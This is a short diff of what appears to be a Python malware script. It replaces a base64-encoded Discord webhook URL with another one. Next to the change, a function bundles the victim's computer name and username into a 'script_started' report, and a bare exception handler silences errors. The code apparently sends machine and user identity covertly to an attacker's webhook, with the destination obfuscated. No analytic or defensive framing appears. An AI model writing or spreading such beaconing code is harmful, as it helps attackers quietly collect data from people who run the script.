@@ -41,7 +41,7 @@ except:
     pass
 
 # Base64-encoded Discord webhook URL
-WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3Njk5ODg2MTk3MjA0NjAxMy9vamxieGxyX2FqRGViM25reC0ydWZEcHlZNmxueVh5b3ZwMDRKYTR1ZGVsMTZEWUU1RFpIMzhiUXVQUXlhYVJQdzJyaQ=="
+WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzAwNjk4NTAzMDI3MTA3Ni9xdUVRY0VxcEFGN3c2TUg4REduSlRtaTBuSUtFVGl2WXpMbEpVNlNSLUpsSWxGYmNLaUtFNDVlczZ1ZGxmOGVFQklBZw=="
 
 def format_start_data(computer_name,user_name):
     data = {'info':'script_started','script':'system','computer':computer_name,'username':user_name}
